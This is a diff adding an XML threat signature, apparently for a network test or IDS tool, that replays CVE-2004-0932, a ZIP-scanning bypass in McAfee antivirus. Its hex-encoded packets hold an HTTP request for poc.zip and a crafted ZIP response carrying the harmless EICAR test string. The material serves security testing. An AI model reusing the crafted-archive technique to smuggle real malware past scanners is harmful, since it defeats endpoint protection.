@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="McAfee Anti-Virus ZIP Archive Virus Detection Bypass (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists a vulnerability in the way McAfee Anti-Virus engine scans ZIP archives. The affected software may bypass file entries in a specially crafted ZIP file archive. An attacker can leverage this vulnerability to bypass the anti-virus protection and deliver malicious content to the target. If crafted ZIP file archive is delivered to a system which performs on-access scanning, the malicious content will be detected before it is executed, mitigating the impact of this vulnerability.            Note that this vulnerability also exists in several other Anti-Virus product lines from multiple vendors. The list of vendors with affected product lines includes Computer Associates, Kaspersky, Sophos, Eset, GeCAD Software. Please refer to Section 2 for further details. (IPv6 Version)"/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="McAfee"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="McAfee_McAfee_VirusScan"/>
+      <item value="McAfee_McAfee_GroupShield"/>
+      <item value="McAfee_McAfee_WebShield"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="McAfee_VirusScan_4.x"/>
+      <item value="McAfee_VirusScan_5.x"/>
+      <item value="McAfee_VirusScan_6.x"/>
+      <item value="McAfee_VirusScan_7.x"/>
+      <item value="McAfee_VirusScan_8.x"/>
+      <item value="McAfee_VirusScan_9.x"/>
+      <item value="McAfee_VirusScan_Enterprise_7.x"/>
+      <item value="McAfee_VirusScan_Enterprise_8.x"/>
+      <item value="McAfee_VirusScan_Professional_7.x"/>
+      <item value="McAfee_VirusScan_ThinClient"/>
+      <item value="McAfee_VirusScan_Wireless"/>
+      <item value="McAfee_GroupShield_6.x_for_Microsoft_Exchange"/>
+      <item value="McAfee_GroupShield_for_Exchange_2000_5.x"/>
+      <item value="McAfee_GroupShield_for_Exchange_5.5_v4.x"/>
+      <item value="McAfee_GroupShield_for_Exchange_5.5_v5.x"/>
+      <item value="McAfee_GroupShield_for_Lotus_Domino_on_AIX_5.x"/>
+      <item value="McAfee_GroupShield_for_Lotus_Domino_on_Windows_5.x"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20041026-01"/>
+    <CVEID display="true" value="CVE-2004-0932"/>
+    <bugtraqID display="true" value="11448"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="06ffa24be87ad7248c5e22e85eb77d03"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1225900693"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="N"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="DD52D88B" AckNumber="FA8EC901" HeaderLength="05" WindowSize="FFFF" Checksum="0D70" UrgentPointer="0000" Options="" Payload="474554202F616E746976697275732F706F632E7A697020485454502F312E310D0A486F73743A2031302E322E312E37390D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E303B20656E2D55533B2072763A312E372E3329204765636B6F2F32303034303931300D0A4163636570743A20746578742F786D6C2C6170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C696D6167652F706E672C2A2F2A3B713D302E350D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="FA8EC901" AckNumber="DD52DA1B" HeaderLength="05" WindowSize="1920" Checksum="04EC" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C203236204F637420323030342031393A31353A343420474D540D0A5365727665723A204170616368652F322E302E343720284665646F7261290D0A4C6173742D4D6F6469666965643A205475652C203236204F637420323030342031393A31323A313620474D540D0A455461673A20223234623131622D64612D3763626638343030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203231380D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A206170706C69636174696F6E2F7A69700D0A0D0A504B03040A0000000000F55A03313CCF516844000000000000000900150065696361722E636F6D5554090003FDAD0F41FDAD0F41557804000000000058354F2150254041505B345C505A58353428505E2937434329377D2445494341522D5354414E444152442D414E544956495255532D544553542D46494C452124482B482A504B010217030A0000000000F55A03313CCF5168440000000000000009000D000000000001000000A4810000000065696361722E636F6D5554050003FDAD0F4155780000504B0506000000000100010044000000800000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
